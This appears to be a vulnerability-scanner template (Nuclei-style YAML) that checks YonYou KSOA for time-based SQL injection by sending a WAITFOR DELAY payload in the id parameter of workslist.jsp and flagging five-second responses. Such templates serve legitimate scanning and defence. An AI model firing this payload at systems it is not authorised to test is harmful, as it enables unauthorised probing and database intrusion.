id: YonYouKSOA-workslist-sqlInjection

info:
  name: YonYouKSOA-workslist-sqlInjection
  author: iSee857
  severity: high
  description: YonYouKSOA-workslist-sqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /worksheet/workslist.jsp?id=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
        Host: {{Host}}
        Content-type:application/x-www-form-urlencoded
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200